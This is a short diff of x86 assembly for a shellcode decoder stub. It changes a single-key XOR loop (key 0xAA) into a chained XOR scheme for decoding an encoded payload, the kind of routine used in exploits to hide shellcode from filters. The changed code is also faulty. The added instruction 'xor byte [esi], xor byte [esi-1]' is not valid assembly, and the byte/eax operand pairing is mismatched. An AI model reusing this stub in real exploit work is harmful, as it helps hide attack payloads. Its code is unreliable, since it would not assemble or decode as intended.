@@ -19,11 +19,15 @@ continueCode:
 	pop esi			; esi contains pointer to shellcode
 	push byte 0xAA
 	pop eax			; eax contains the key
-	push byte 25
-	pop ecx			; ecx contains the shellcode length
+	push byte 24
+	pop ecx			; ecx contains the shellcode length minus one
+
+	xor byte [esi], eax
+	inc esi
 
 decode:
-	xor byte [esi], eax
+
+	xor byte [esi], xor byte [esi-1]
 	inc esi
 
 	loop decode
